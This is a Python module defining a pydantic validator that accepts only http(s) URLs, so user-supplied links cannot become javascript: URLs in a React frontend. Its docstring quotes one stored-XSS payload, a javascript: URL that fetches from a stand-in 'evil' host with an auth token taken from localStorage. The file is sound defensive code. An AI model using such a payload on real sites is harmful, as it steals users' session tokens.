"""Shared field types for request schemas."""
import re
from typing import Annotated
from urllib.parse import urlsplit

from pydantic import AfterValidator

MAX_URL_LENGTH = 500
_HAS_SCHEME = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:")


def normalize_web_url(value: str) -> str:
    """Return `value` as a safe absolute http(s) URL, or raise ValueError.

    Every user-supplied URL ends up in an <a href> or <img src> somewhere in the frontend.
    Without this, a value like `javascript:fetch('//evil?'+localStorage['turnup-auth'])`
    saved as a profile website runs in the browser of anyone who clicks it (React 18 does not
    block javascript: URLs). Only http and https are allowed; a bare domain such as
    "mysite.com" gets https:// prepended for convenience. An empty string is passed through
    unchanged so clients can still clear a field.
    """
    v = value.strip()
    if v == "":
        return v
    if len(v) > MAX_URL_LENGTH:
        raise ValueError(f"URL is too long (max {MAX_URL_LENGTH} characters)")
    if any(ord(c) < 0x20 or c.isspace() for c in v):
        raise ValueError("URL must not contain spaces or control characters")
    if not _HAS_SCHEME.match(v):
        v = "https://" + v.lstrip("/")
    parts = urlsplit(v)
    if parts.scheme.lower() not in ("http", "https"):
        raise ValueError("URL must start with http:// or https://")
    if not parts.hostname:
        raise ValueError("URL must include a domain")
    return v


def safe_web_url_or_none(value: str | None) -> str | None:
    """Lenient variant for URLs from scraped/AI-generated content: drop instead of raising."""
    if not value:
        return None
    try:
        return normalize_web_url(value) or None
    except ValueError:
        return None


WebUrl = Annotated[str, AfterValidator(normalize_web_url)]
